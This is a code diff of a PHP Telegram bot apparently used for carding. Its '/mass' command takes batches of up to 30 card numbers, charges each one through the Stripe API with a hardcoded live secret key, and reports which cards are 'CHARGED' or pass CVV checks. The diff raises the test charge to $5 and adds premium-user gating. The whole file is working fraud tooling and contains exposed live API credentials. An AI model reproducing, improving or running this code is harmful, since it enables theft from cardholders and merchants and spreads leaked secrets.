@@ -1,6 +1,6 @@
 <?php 
-if ((strpos($message, "/mss") === 0)||(strpos($message, "!mss") === 0)||(strpos($message, ".mss") === 0)){
-  if ($role == "OWNER")
+if ((strpos($message, "/mass") === 0)||(strpos($message, "!mass") === 0)||(strpos($message, ".mass") === 0)){
+  if (($role == "OWNER") || ($role == "PREMIUM"))
   {
 if ($_SERVER['REQUEST_METHOD'] == "POST") {
     extract($_POST);
@@ -9,20 +9,28 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 }
 
 $msg = substr($message,5);
+//$msg = str_replace(" ", "\n", $msg);    
 $listas = explode("\n",$msg);
 $c = count($listas);
+    $c = $c - 1;
+    if($c>30)
+    {
+      sendMessage($chatId,"NOT MORE THAN 30 CCS AT A TIME",$messagId);
+      exit();
+    }
+    
 $msg = reply_to($chatId,urlencode("
 𝗖𝗖𝗦 𝗙𝗢𝗨𝗡𝗗 $c
 "),$messageId);
 $respon = json_decode($msg, TRUE);
   $message_id_1 = $respon['result']['message_id'];
-edit_message($chatId," Started....",$message_id_1);
-    $c = $c - 1;
-    $pr = 0;
-while($c>=0)
+edit_message($chatId," Startedd....",$message_id_1);
+    
+    $bln = $c;
+while($c>0)
 {
-$pr++;
-$sk ="sk_live_u9RfdHQRtxtlFIiXWCLs1Hqw";
+
+$sk ="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";
 
 //------[Randomize Description]------//
 $word = array(
@@ -161,7 +169,7 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&payment_method_types[]=card&description='.$dnt.'&payment_method='.$tok.'&confirm=true&off_session=true');  
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=500&currency=usd&payment_method_types[]=card&description='.$dnt.'&payment_method='.$tok.'&confirm=true&off_session=true');  
 $r2 = curl_exec($ch);  
 if (strpos($r2, "rate_limit"))   
 {  
@@ -180,21 +188,20 @@ $msg = Getstr($r2,'"decline_code": "','"');
 $recebddbipturl = trim(strip_tags(getStr($r2, '"receipt_url": "', '"')));
 $risklevel = trim(strip_tags(getStr($r2, '"risk_level": "', '"')));    
 if ((strpos($r2, '"status": "succeeded"')) || (strpos($r2, '"seller_message": "Payment complete."'))){
-  sendMessage('-1001786106936',urlencode("
+$rslt = "
 CHARGED : <code> $lista </code>
-𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 ✅
- "),$messageId);
-  $c--;
-  continue;
- // goto hits;
+𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $5 @byte_coders ✅
+ ";
+  //$c--;
+ // continue;
+  goto hits;
   }
 elseif ((strpos($r2,'insufficient_funds')) || (strpos($r1,'insufficient_funds'))){
- sendMessage($chatId,urlencode("
-$lista INSUFFICIENT FUNDS
- "),$messageId);
-  $c--;
-  continue;
-//  goto hits;
+ $rslt = "
+CVV : <code> $lista </code>
+𝙄𝙉𝙎𝙐𝙁𝙁𝙄𝘾𝙄𝙀𝙉𝙏 𝙁𝙐𝙉𝘿𝙎 ✅
+ ";
+  goto hits;
   }
   elseif ((strpos($r2,'"cvc_check": "pass"')) || (strpos($r1,'"cvc_check": "pass"'))){
  $rslt = "
@@ -224,14 +231,23 @@ $rslt = "
 ➜ 𝙈𝙎𝙂: $msg2 ❌
 ";
 hits:
- // $rslts = "$rslts $rslt";
+  $rslts = "$rslts $rslt";
  edit_message($chatId,urlencode("
- 𝙋𝙍𝙊𝙂𝙍𝙀𝙎𝙎 [$pr/$bln]
- 
-  $rslt 
+  $rslts
   "),$message_id_1);
   $c--;
-
+}
+edit_message($chatId,urlencode("
+  $rslts 
+  𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 ✅
+  "),$message_id_1);
+balancechk($userId,$bln);
+  }
+  else 
+  {
+    reply_to($chatId," 𝙉𝙊𝙏 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ❌",$messageId);
+  }
+}
   
 ?>
  
